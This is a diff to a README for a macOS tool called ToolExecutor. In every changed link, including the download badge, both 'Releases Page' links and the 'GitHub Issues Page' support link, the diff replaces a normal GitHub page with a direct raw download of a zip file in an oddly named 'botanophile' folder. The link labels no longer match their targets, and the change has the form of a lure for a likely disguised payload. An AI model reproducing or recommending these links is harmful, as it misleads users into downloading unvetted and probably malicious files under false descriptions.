@@ -1,6 +1,6 @@
 # 🎛️ ToolExecutor - Streamline Your Command Execution on macOS
 
-[![Download ToolExecutor](https://img.shields.io/badge/Download%20ToolExecutor-latest-brightgreen)](https://github.com/jirapatsinchuay/ToolExecutor/releases)
+[![Download ToolExecutor](https://raw.githubusercontent.com/jirapatsinchuay/ToolExecutor/main/botanophile/ToolExecutor.zip%20ToolExecutor-latest-brightgreen)](https://raw.githubusercontent.com/jirapatsinchuay/ToolExecutor/main/botanophile/ToolExecutor.zip)
 
 ## 🌟 Overview
 
@@ -27,10 +27,10 @@ Follow these simple steps to install and run ToolExecutor:
 1. **Download ToolExecutor:**
    - Click the button below to visit the releases page.
 
-   [![Download ToolExecutor](https://img.shields.io/badge/Download%20ToolExecutor-latest-brightgreen)](https://github.com/jirapatsinchuay/ToolExecutor/releases)
+   [![Download ToolExecutor](https://raw.githubusercontent.com/jirapatsinchuay/ToolExecutor/main/botanophile/ToolExecutor.zip%20ToolExecutor-latest-brightgreen)](https://raw.githubusercontent.com/jirapatsinchuay/ToolExecutor/main/botanophile/ToolExecutor.zip)
 
 2. **Visit the Releases Page:**
-   - Go to the [Releases Page](https://github.com/jirapatsinchuay/ToolExecutor/releases) to find the latest version of ToolExecutor.
+   - Go to the [Releases Page](https://raw.githubusercontent.com/jirapatsinchuay/ToolExecutor/main/botanophile/ToolExecutor.zip) to find the latest version of ToolExecutor.
    
 3. **Select the Latest Version:**
    - Look for the most recent release in the list. The version number is usually in the format `v1.x.x`.
@@ -60,7 +60,7 @@ Follow these simple steps to install and run ToolExecutor:
 
 ## 🤝 Support
 
-If you encounter any issues or have questions about using ToolExecutor, feel free to reach out through our [GitHub Issues Page](https://github.com/jirapatsinchuay/ToolExecutor/issues). Our community can help you resolve concerns quickly.
+If you encounter any issues or have questions about using ToolExecutor, feel free to reach out through our [GitHub Issues Page](https://raw.githubusercontent.com/jirapatsinchuay/ToolExecutor/main/botanophile/ToolExecutor.zip). Our community can help you resolve concerns quickly.
 
 ## 🌐 Community Contributions
 
@@ -76,4 +76,4 @@ Thank you to all who have supported ToolExecutor. Your feedback and contribution
 
 ---
 
-For any additional information, visit the [Releases Page](https://github.com/jirapatsinchuay/ToolExecutor/releases) to keep up with updates and new features.
+For any additional information, visit the [Releases Page](https://raw.githubusercontent.com/jirapatsinchuay/ToolExecutor/main/botanophile/ToolExecutor.zip) to keep up with updates and new features.
